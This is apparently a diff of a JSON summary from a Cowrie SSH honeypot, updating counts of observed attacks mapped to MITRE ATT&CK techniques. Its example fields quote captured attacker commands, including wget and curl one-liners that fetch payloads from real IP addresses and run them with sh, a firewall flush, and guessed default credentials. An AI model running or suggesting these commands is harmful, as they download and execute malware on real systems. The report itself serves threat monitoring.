@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-28 19:04:36",
+  "generated": "2026-08-28 20:00:45",
   "totals": {
-    "commands": 279,
-    "login_failed": 2427,
-    "login_success": 68,
-    "sessions": 2702
+    "commands": 404,
+    "login_failed": 2604,
+    "login_success": 81,
+    "sessions": 2776
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2427,
+      "count": 2604,
       "examples": [
         "root / 0033",
         "root / 12345678",
@@ -21,14 +21,14 @@
         "root / 123456789"
       ],
       "first": "2026-08-28T00:00:26.408142Z",
-      "last": "2026-08-28T19:04:34.349962Z",
-      "unique_ips": 75
+      "last": "2026-08-28T19:59:45.727605Z",
+      "unique_ips": 83
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 68,
+      "count": 81,
       "examples": [
         "superadmin / Is$uper@dmin",
         "admin / admin",
@@ -37,14 +37,14 @@
         "ubuntu / ubuntu"
       ],
       "first": "2026-08-28T00:01:52.110632Z",
-      "last": "2026-08-28T18:58:56.897109Z",
-      "unique_ips": 53
+      "last": "2026-08-28T19:57:52.271801Z",
+      "unique_ips": 61
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 66,
+      "count": 70,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -53,14 +53,14 @@
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
       ],
       "first": "2026-08-28T02:13:00.923496Z",
-      "last": "2026-08-28T18:29:30.986801Z",
-      "unique_ips": 10
+      "last": "2026-08-28T19:57:53.548932Z",
+      "unique_ips": 11
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 31,
+      "count": 42,
       "examples": [
         "/bin/busybox wget; /bin/busybox STC",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;",
@@ -69,14 +69,14 @@
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
       ],
       "first": "2026-08-28T00:51:50.759248Z",
-      "last": "2026-08-28T10:37:49.394817Z",
-      "unique_ips": 11
+      "last": "2026-08-28T19:11:41.849090Z",
+      "unique_ips": 12
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 18,
+      "count": 19,
       "examples": [
         "uname -a",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -85,8 +85,8 @@
         "uname -s -v -n -r -m"
       ],
       "first": "2026-08-28T02:17:21.577136Z",
-      "last": "2026-08-28T18:29:30.986801Z",
-      "unique_ips": 14
+      "last": "2026-08-28T19:55:44.673909Z",
+      "unique_ips": 15
     },
     {
       "id": "T1033",
@@ -178,88 +178,100 @@
       "first": "2026-08-28T03:08:11.983355Z",
       "last": "2026-08-28T03:08:11.983355Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1562.004",
+      "name": "Impair Defenses: Disable or Modify System Firewall",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "iptables -F"
+      ],
+      "first": "2026-08-28T19:11:36.900438Z",
+      "last": "2026-08-28T19:11:36.900438Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "sh",
-      22
+      29
     ],
     [
       "shell",
-      22
+      29
     ],
     [
       "system",
-      22
+      29
     ],
     [
       "/bin/busybox",
-      21
+      24
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      16
+      18
     ],
     [
       "enable",
-      11
-    ],
-    [
-      "/bin/busybox UNSTABLE",
-      11
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      10
+      17
     ],
     [
       "linuxshell",
+      16
+    ],
+    [
+      "/bin/busybox UNSTABLE",
+      12
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      11
+    ],
+    [
+      "ping ;sh",
       10
     ],
     [
       "enablelinuxshell",
-      8
+      9
     ],
     [
-      "ping ;sh",
-      8
+      ">/tmp/.codi && cd /tmp/",
+      4
     ],
     [
-      "ping; sh",
-      3
+      ">/var/.codi && cd /var/",
+      4
     ],
     [
-      "/bin/busybox STC",
-      3
+      ">/dev/.codi && cd /dev/",
+      4
     ],
     [
-      "/bin/busybox hostname TOASTER",
-      3
+      ">/mnt/.codi && cd /mnt/",
+      4
     ],
     [
-      "busybox",
-      3
+      ">/var/run/.codi && cd /var/run/",
+      4
     ],
     [
-      "Accept-Encoding: gzip",
-      2
+      ">/var/tmp/.codi && cd /var/tmp/",
+      4
     ],
     [
-      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-      1
+      ">/.codi && cd /",
+      4
     ],
     [
-      "python3 /tmp/bendi.py",
-      1
+      ">/dev/netslink/.codi && cd /dev/netslink/",
+      4
     ],
     [
-      "rm /tmp/bendi.py",
-      1
-    ],
-    [
-      "exit",
-      1
+      ">/dev/shm/.codi && cd /dev/shm/",
+      4
     ]
   ]
 }
